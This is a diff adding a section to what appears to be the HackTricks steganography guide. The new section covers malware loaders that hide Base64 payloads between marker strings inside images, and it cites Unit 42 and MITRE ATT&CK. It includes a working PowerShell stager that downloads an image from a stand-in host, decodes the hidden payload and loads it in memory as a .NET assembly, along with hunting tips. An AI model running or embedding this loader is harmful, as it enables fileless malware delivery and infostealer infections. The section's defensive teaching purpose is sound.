@@ -153,6 +153,37 @@ For further exploration, consider visiting:
 - [OpenStego](https://www.openstego.com/)
 - [DIIT](https://diit.sourceforge.net/)
 
+## Marker-delimited Base64 payloads hidden in images (malware delivery)
+
+Commodity loaders increasingly hide Base64-encoded payloads as plain text inside otherwise valid images (often GIF/PNG). Instead of pixel-level LSB, the payload is delimited by unique start/end marker strings embedded in the file text/metadata. A PowerShell stager then:
+- Downloads the image over HTTP(S)
+- Locates the marker strings (examples observed: <<sudo_png>> … <<sudo_odt>>)
+- Extracts the between-text and Base64-decodes it to bytes
+- Loads the .NET assembly in-memory and invokes a known entry method (no file written to disk)
+
+Minimal PowerShell carving/loading snippet
+
+```powershell
+$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
+$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
+$s = $img.IndexOf($start); $e = $img.IndexOf($end)
+if($s -ge 0 -and $e -gt $s){
+  $b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
+  $bytes = [Convert]::FromBase64String($b64)
+  [Reflection.Assembly]::Load($bytes) | Out-Null
+}
+```
+
+Notes
+- This falls under ATT&CK T1027.003 (steganography). Marker strings vary between campaigns.
+- Hunting: scan downloaded images for known delimiters; flag `PowerShell` using `DownloadString` followed by `FromBase64String`.
+
+See also phishing delivery examples and full in-memory invocation flow here:
+
+{{#ref}}
+../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
+{{#endref}}
+
 ## **Extracting Data from Audios**
 
 **Audio steganography** offers a unique method to conceal information within sound files. Different tools are utilized for embedding or retrieving hidden content.
@@ -216,6 +247,8 @@ For translating Braille, the [Branah Braille Translator](https://www.branah.com/
 
 - [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
 - [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
+- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
+- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
 
 {{#include ../banners/hacktricks-training.md}}
 
